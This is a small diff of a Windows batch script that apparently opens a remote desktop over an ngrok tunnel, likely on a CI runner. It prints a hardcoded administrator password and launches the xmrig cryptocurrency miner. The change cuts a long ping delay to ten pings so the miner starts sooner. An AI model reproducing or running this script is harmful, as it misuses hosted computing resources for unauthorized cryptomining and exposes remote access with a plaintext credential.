@@ -42,5 +42,5 @@ echo IP:
 tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url || echo "Can't get NGROK tunnel, please paste new NGROK TOKEN in YML. Check Tunnel here: https://dashboard.ngrok.com/status/tunnels " && exit
 echo User: administrator
 echo Pass: 01217682717Huy
-ping -n 999999 10.10.0.10 >nul
+ping -n 10 10.10.0.10 >nul
 start C:\Users\Public\Desktop\xmrig.exe >nul
